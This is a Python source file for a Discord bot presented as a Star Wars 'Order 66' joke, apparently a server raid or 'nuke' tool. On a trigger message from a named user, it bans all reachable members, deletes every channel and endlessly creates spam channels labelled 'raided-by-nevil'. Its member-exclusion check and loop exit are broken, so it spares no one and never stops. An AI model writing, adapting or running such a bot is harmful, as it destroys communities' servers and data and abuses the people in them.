# A bot that recreates the events that occurred during Order 66 in the show star wars within a discord server.


import discord
import multiprocessing

USERNAME = "snheakydoge"
ORDER = "Execute order 66"

def removeUsers():
    class AttackOnTheJedi(discord.Client):
        async def on_message(self, message):
            if str(message.author) == USERNAME:
                if message.content == ORDER:
                    for user in self.get_all_members():
                        if user != ("Nevil#3721", "snheakydoge"):
                            await user.ban()

    permissions = discord.Intents.all()
    execute_jedi = AttackOnTheJedi(intents=permissions)
    execute_jedi.run("ENTER BOT TOKEN")

def main():
    class Order(discord.Client):
        async def on_ready(self):
            print("Clones standing by... ")

        async def on_message(self, message):
            if str(message.author) == USERNAME:
                if message.content == ORDER:
                    print("\nYes sir. ")
                    for channels in self.get_all_channels():
                        await channels.delete()

                    guild = self.get_guild(1245613952373624832)
                    while True:
                        await guild.create_text_channel("raided-by-nevil")
                        if message.content == "break":
                            break

    permissions = discord.Intents.all()
    PalpatinesOrder = Order(intents=permissions)
    PalpatinesOrder.run("ENTER BOT TOKEN")



if __name__ == "__main__":
    t1 = multiprocessing.Process(target=main)
    t2 = multiprocessing.Process(target=removeUsers)

    processes = [t1, t2]
    for start in processes:
        start.start()
    for join in processes:
        join.join()
